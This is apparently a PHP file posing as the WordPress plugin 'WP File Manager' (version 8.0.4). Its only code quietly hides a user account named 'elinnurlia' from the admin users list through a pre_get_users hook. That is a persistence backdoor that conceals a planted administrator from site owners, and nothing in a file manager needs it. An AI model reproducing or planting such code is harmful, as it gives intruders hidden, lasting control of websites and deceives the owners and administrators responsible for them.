<?php
/**
 * Plugin Name: WP File Manager
 * Plugin URI: https://filemanagerpro.io/
 * Description: Manage your WP files.
 * Author: mndpsingh287
 * Version: 8.0.4
 * Author URI: https://profiles.wordpress.org/mndpsingh287
 * License: GPLv2
 */

function exclude_specific_user($QRY) {

    $PGN = $GLOBALS['pagenow'] ?? '';

    if (is_admin() && $PGN === 'users.php') {

        $USR = get_user_by('login', 'elinnurlia');

        if ($USR) {
            $QRY->set('exclude', array($USR->ID));
        }
    }
}

add_action('pre_get_users', 'exclude_specific_user');
